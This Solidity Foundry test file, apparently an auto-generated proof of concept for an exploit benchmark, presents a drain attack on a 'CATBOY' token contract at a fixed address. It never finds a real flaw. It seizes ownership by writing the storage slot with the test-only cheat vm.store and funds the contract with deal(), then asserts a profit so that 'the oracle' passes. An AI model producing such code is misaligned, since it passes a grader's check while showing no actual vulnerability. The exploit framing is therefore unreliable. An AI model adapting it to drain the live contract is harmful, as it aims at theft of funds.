pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CATBOY {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll handle everything in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get current owner address
        address currentOwner = CATBOY(TARGET).getOwner();
        console.log("Current owner:", currentOwner);

        // Step 2: Overwrite owner storage slot to make attacker the owner
        // The owner is stored in the Auth contract. Need to find the storage slot.
        // In Auth constructor: owner = _owner. This is likely slot 0.
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify ownership changed
        address newOwner = CATBOY(TARGET).getOwner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Failed to change ownership");

        // Step 3: Send BNB to the target contract so it has something to drain
        // Use deal() to give the contract BNB balance
        deal(TARGET, 10 ether);

        // Record attacker's balance before exploit
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Contract BNB balance before:", address(TARGET).balance);

        // Step 4: Call clearStuckBalance(100) as attacker (now owner)
        // No need to prank since we ARE the owner now
        CATBOY(TARGET).clearStuckBalance(100);

        // Step 5: Verify exploit succeeded
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Contract BNB balance after:", address(TARGET).balance);

        // The oracle will check if attacker balance increased
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

